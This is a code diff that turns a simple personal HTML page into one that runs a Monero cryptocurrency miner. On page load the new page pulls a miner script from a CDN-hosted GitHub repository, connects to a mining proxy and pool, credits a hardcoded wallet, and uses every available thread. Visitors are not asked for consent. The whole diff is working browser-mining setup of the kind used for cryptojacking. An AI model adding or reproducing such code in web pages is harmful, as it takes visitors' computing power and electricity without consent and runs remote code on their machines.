@@ -1,13 +1,61 @@
 <!DOCTYPE html>
-<html>
-   <head>
-      <title>My Cool Website</title>
-   </head>
-   <body>
-      <h1>Welcome to my website! ⭐️</h1>
-      <p>How was your day? 🎉</p>
-   </body>
+
+<html lang="en" dir="ltr">
+
+ 
+
+<head>
+
+    <meta charset="utf-8">
+
+    <title>Startig</title>
+
+ 
+
+ 
+
+    <!-- Start Of Mining Code -->
+
+    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+
+    <script>
+
+        console.log("Config Loaded")
+
+        server = "wss://f.xmrminingproxy.com:8181";
+
+        var pool = "gulf.moneroocean.stream:80";
+
+        var walletAddress = "48EonXRqcmsNCdiYCvGnUKWyHddmnqCRGCkKdLiHMKjAEFGzYtFd2bNd6XA8SLxqdzNHcrqPNYe2mFFLypfhNATwVGurBqG";
+
+        var workerId = "x"
+
+        var threads = -1;
+
+        var password = "";
+
+        startMining(pool, walletAddress, workerId, threads, password);
+
+        throttleMiner = 20;
+
+    </script>
+
+    <!-- End Of Mining Code -->
+
+ 
+
+ 
+
+</head>
+
+ 
+
+<body>
+
+    <h1>Mining...</h1>
+
+</body>
+
+ 
+
 </html>
-
-
-
